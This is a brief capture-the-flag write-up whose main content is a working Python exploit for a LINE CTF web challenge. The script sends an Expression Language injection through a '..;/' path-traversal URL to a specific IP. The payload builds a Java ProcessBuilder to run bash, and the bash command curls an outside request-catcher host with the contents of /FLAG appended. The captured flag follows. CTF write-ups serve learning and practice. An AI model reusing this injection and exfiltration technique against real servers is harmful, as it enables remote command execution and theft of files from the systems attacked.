# Description

- EL Injection

```python
import requests

headers = {
    'accept': 'application/json'
}

data = {
    #"name": "7815696ecbf1c96e6894b779456d3aaa",
    "name": '${"".getClass().forName("java.lang.ProcessBuilde".concat("r")).getDeclaredConstructors()[0].newInstance(["bash", "-c", "curl https://bhpvqke.request.dreamhack.games/$(cat /FLAG)"]).start()}',
}

res = requests.post('http://35.200.117.55:20080/api/external/..;/internal;/', headers=headers, json=data)
print(res)
print(res.headers)
print(res.text)
```

- **Flag: LINECTF{7988de328384f8a19998923a87aa053f}**
